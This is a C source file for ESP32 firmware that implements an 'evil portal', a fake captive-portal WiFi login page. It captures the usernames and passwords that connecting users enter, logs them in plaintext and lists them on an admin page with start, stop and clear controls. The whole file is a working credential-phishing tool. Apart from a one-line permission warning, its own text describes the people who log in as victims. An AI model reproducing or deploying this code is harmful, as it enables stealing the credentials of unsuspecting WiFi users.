#include "evil_portal.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_http_server.h"
#include <string.h>
#include <stdio.h>
#include <inttypes.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "EVIL_PORTAL";
static bool running = false;
static httpd_handle_t portal_server = NULL;

#define MAX_CREDS 10
typedef struct {
    char username[32];
    char password[32];
    uint32_t timestamp;
} credential_t;
static credential_t creds[MAX_CREDS];
static int cred_count = 0;
static SemaphoreHandle_t creds_mutex = NULL;

// Captive portal login page
static const char *captive_portal_html =
"<!DOCTYPE html>"
"<html>"
"<head>"
"<meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
"<title>WiFi Login</title>"
"<style>"
"body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); "
"       display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }"
".login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); "
"             width: 90%; max-width: 400px; }"
"h2 { text-align: center; color: #333; margin-bottom: 30px; }"
".input-group { margin-bottom: 20px; }"
"label { display: block; margin-bottom: 5px; color: #555; font-weight: bold; }"
"input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; box-sizing: border-box; }"
"input:focus { outline: none; border-color: #667eea; }"
"button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 5px; "
"         font-size: 18px; font-weight: bold; cursor: pointer; }"
"button:hover { background: #5568d3; }"
".note { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }"
"</style>"
"</head>"
"<body>"
"<div class='login-box'>"
"<h2>&#x1F4F6; WiFi Authentication</h2>"
"<form action='/submit' method='POST'>"
"<div class='input-group'>"
"<label>Username or Email:</label>"
"<input type='text' name='username' required>"
"</div>"
"<div class='input-group'>"
"<label>Password:</label>"
"<input type='password' name='password' required>"
"</div>"
"<button type='submit'>Connect to WiFi</button>"
"</form>"
"<div class='note'>Please login to access the internet</div>"
"</div>"
"</body>"
"</html>";

// Success page after credential capture
static const char *success_html =
"<!DOCTYPE html>"
"<html>"
"<head>"
"<meta charset='UTF-8'>"
"<meta http-equiv='refresh' content='3;url=/'>"
"<title>Connected</title>"
"<style>"
"body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; "
"       align-items: center; height: 100vh; margin: 0; }"
".message { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; }"
"h2 { color: #4CAF50; }"
"</style>"
"</head>"
"<body>"
"<div class='message'>"
"<h2>&#x2705; Connected Successfully</h2>"
"<p>You are now connected to the network.</p>"
"<p>Redirecting...</p>"
"</div>"
"</body>"
"</html>";

// Handler for captive portal root
static esp_err_t portal_root_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, captive_portal_html, strlen(captive_portal_html));
    return ESP_OK;
}

// Handler for credential submission
static esp_err_t portal_submit_handler(httpd_req_t *req) {
    char buf[256];
    int ret, remaining = req->content_len;

    if (remaining > sizeof(buf) - 1) {
        remaining = sizeof(buf) - 1;
    }

    ret = httpd_req_recv(req, buf, remaining);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }
    buf[ret] = '\0';

    // Parse POST data (format: username=...&password=...)
    char username[32] = {0};
    char password[32] = {0};
    
    char *user_param = strstr(buf, "username=");
    char *pass_param = strstr(buf, "password=");
    
    if (user_param && pass_param) {
        user_param += 9; // Skip "username="
        char *user_end = strchr(user_param, '&');
        int user_len = user_end ? (user_end - user_param) : strlen(user_param);
        if (user_len > 31) user_len = 31;
        strncpy(username, user_param, user_len);
        
        pass_param += 9; // Skip "password="
        char *pass_end = strchr(pass_param, '&');
        int pass_len = pass_end ? (pass_end - pass_param) : strlen(pass_param);
        if (pass_len > 31) pass_len = 31;
        strncpy(password, pass_param, pass_len);
        
        // Store credentials
        if (creds_mutex == NULL) {
            creds_mutex = xSemaphoreCreateMutex();
        }
        
        xSemaphoreTake(creds_mutex, portMAX_DELAY);
        if (cred_count < MAX_CREDS) {
            strncpy(creds[cred_count].username, username, 31);
            strncpy(creds[cred_count].password, password, 31);
            creds[cred_count].timestamp = xTaskGetTickCount() / 1000;
            cred_count++;
            ESP_LOGI(TAG, "Captured credentials - User: %s, Pass: %s", username, password);
        }
        xSemaphoreGive(creds_mutex);
    }

    // Send success page
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, success_html, strlen(success_html));
    return ESP_OK;
}

// Catch-all handler for captive portal detection
static esp_err_t portal_catchall_handler(httpd_req_t *req) {
    return portal_root_handler(req);
}

void evil_portal_start(void) {
    if (running) {
        ESP_LOGW(TAG, "Evil portal already running");
        return;
    }
    
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.ctrl_port = 32768;
    config.stack_size = 8192;
    
    if (httpd_start(&portal_server, &config) == ESP_OK) {
        // Register handlers
        httpd_uri_t root_uri = {
            .uri = "/",
            .method = HTTP_GET,
            .handler = portal_root_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(portal_server, &root_uri);
        
        httpd_uri_t submit_uri = {
            .uri = "/submit",
            .method = HTTP_POST,
            .handler = portal_submit_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(portal_server, &submit_uri);
        
        // Catch-all for captive portal detection URLs
        httpd_uri_t catchall_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = portal_catchall_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(portal_server, &catchall_uri);
        
        running = true;
        ESP_LOGI(TAG, "Evil portal started on port 80");
    } else {
        ESP_LOGE(TAG, "Failed to start evil portal server");
    }
}

void evil_portal_stop(void) {
    if (!running) return;
    
    if (portal_server != NULL) {
        httpd_stop(portal_server);
        portal_server = NULL;
    }
    
    running = false;
    ESP_LOGI(TAG, "Evil portal stopped");
}

esp_err_t evil_portal_handler(httpd_req_t *req) {
    ESP_LOGI(TAG, "Evil portal page requested");
    
    char query[128];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (strstr(query, "stop=1")) {
            evil_portal_stop();
            const char *stopped_msg = 
            "<!DOCTYPE html><html><head><title>Portal Stopped</title>"
            "<meta http-equiv='refresh' content='2;url=/wifi_evil'>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #0a0f1c; color: #f5c542; padding: 20px; text-align: center; }"
            "</style></head><body>"
            "<h1>&#x2705; Evil Portal Stopped</h1>"
            "<p>Redirecting...</p>"
            "</body></html>";
            httpd_resp_set_type(req, "text/html");
            httpd_resp_send(req, stopped_msg, strlen(stopped_msg));
            return ESP_OK;
        }
        if (strstr(query, "start=1")) {
            evil_portal_start();
            const char *started_msg = 
            "<!DOCTYPE html><html><head><title>Portal Started</title>"
            "<meta http-equiv='refresh' content='2;url=/wifi_evil'>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #0a0f1c; color: #f5c542; padding: 20px; text-align: center; }"
            "</style></head><body>"
            "<h1>&#x26A1; Evil Portal Started</h1>"
            "<p>Redirecting...</p>"
            "</body></html>";
            httpd_resp_set_type(req, "text/html");
            httpd_resp_send(req, started_msg, strlen(started_msg));
            return ESP_OK;
        }
        if (strstr(query, "clear=1")) {
            if (creds_mutex == NULL) {
                creds_mutex = xSemaphoreCreateMutex();
            }
            xSemaphoreTake(creds_mutex, portMAX_DELAY);
            cred_count = 0;
            memset(creds, 0, sizeof(creds));
            xSemaphoreGive(creds_mutex);
        }
    }
    
    bool is_running = running;
    
    // Build credentials table
    char cred_rows[2048] = "";
    int row_offset = 0;
    
    if (creds_mutex == NULL) {
        creds_mutex = xSemaphoreCreateMutex();
    }
    
    xSemaphoreTake(creds_mutex, portMAX_DELAY);
    for (int i = 0; i < cred_count && row_offset < 1900; i++) {
        row_offset += snprintf(cred_rows + row_offset, sizeof(cred_rows) - row_offset,
            "<tr><td>%s</td><td>%s</td><td>%" PRIu32 "s</td></tr>",
            creds[i].username, creds[i].password, creds[i].timestamp);
    }
    xSemaphoreGive(creds_mutex);
    
    if (cred_count == 0) {
        strcpy(cred_rows, "<tr><td colspan='3' style='text-align:center;'>No credentials captured yet</td></tr>");
    }
    
    const char *html_template = 
    "<!DOCTYPE html>"
    "<html lang='en'>"
    "<head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "<title>Evil Portal</title>"
    "<style>"
    "body { background: #0a0f1c; color: #f5c542; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }"
    "h1 { text-align: center; color: #f5c542; }"
    ".status { padding: 15px; margin: 20px 0; border-radius: 8px; text-align: center; font-weight: bold; }"
    ".status.running { background: #ff4444; color: white; }"
    ".status.stopped { background: #44ff44; color: #0a0f1c; }"
    ".info { background: #1a1f2c; padding: 15px; border-radius: 8px; margin: 20px 0; }"
    ".control { margin: 20px 0; }"
    ".btn { display: inline-block; padding: 12px 20px; margin: 10px 5px; background: #f5c542; color: #0a0f1c; text-decoration: none; font-weight: bold; border-radius: 8px; border: none; cursor: pointer; }"
    ".btn:hover { background: #d4a017; }"
    ".btn.danger { background: #ff4444; color: white; }"
    "table { width: 100%; border-collapse: collapse; margin-top: 20px; }"
    "th, td { padding: 10px; border: 1px solid #f5c542; text-align: left; }"
    "th { background: #1a1f2c; color: #f5c542; }"
    "tr:nth-child(even) { background: #111111; }"
    "</style>"
    "</head>"
    "<body>"
    "<div class='container'>"
    "<h1>&#x1F4E1; Evil Portal</h1>"
    "<div class='status %s'>%s</div>"
    "<div class='info'>"
    "<p>&#x1F4E1; <strong>How it works:</strong> Creates a fake captive portal login page. "
    "When victims connect to your AP, they're prompted to \"authenticate\" and their credentials are captured.</p>"
    "<p>&#x26A0; <strong>Warning:</strong> Only use on networks you own or have permission to test.</p>"
    "</div>"
    "<div class='control' style='text-align: center;'>"
    "%s"
    "</div>"
    "<h3>&#x1F4CA; Captured Credentials (%d)</h3>"
    "<table>"
    "<tr><th>Username</th><th>Password</th><th>Time (seconds)</th></tr>"
    "%s"
    "</table>"
    "<div style='text-align: center; margin-top: 30px;'>"
    "<a href='/' class='btn'>&#x2B05; Back to Main Menu</a>"
    "</div>"
    "</div>"
    "</body>"
    "</html>";
    
    const char *status_class = is_running ? "running" : "stopped";
    const char *status_text = is_running ? "&#x1F534; PORTAL ACTIVE" : "&#x1F7E2; Portal Stopped";
    
    static char controls_buf[256];
    if (cred_count > 0) {
        if (is_running) {
            snprintf(controls_buf, sizeof(controls_buf),
                "<a href='/wifi_evil?stop=1' class='btn danger'>&#x23F9; Stop Portal</a>"
                "<a href='/wifi_evil?clear=1' class='btn'>&#x1F5D1; Clear Credentials</a>");
        } else {
            snprintf(controls_buf, sizeof(controls_buf),
                "<a href='/wifi_evil?start=1' class='btn'>&#x25B6; Start Evil Portal</a>"
                "<a href='/wifi_evil?clear=1' class='btn'>&#x1F5D1; Clear Credentials</a>");
        }
    } else {
        snprintf(controls_buf, sizeof(controls_buf),
            is_running ?
            "<a href='/wifi_evil?stop=1' class='btn danger'>&#x23F9; Stop Portal</a>" :
            "<a href='/wifi_evil?start=1' class='btn'>&#x25B6; Start Evil Portal</a>");
    }
    
    char *response = malloc(8192);
    if (!response) {
        ESP_LOGE(TAG, "Failed to allocate response buffer");
        const char *error_msg = "<html><body><h1>Memory Error</h1></body></html>";
        httpd_resp_send(req, error_msg, strlen(error_msg));
        return ESP_FAIL;
    }
    
    snprintf(response, 8192, html_template, status_class, status_text, controls_buf, cred_count, cred_rows);
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, response, strlen(response));
    free(response);
    return ESP_OK;
}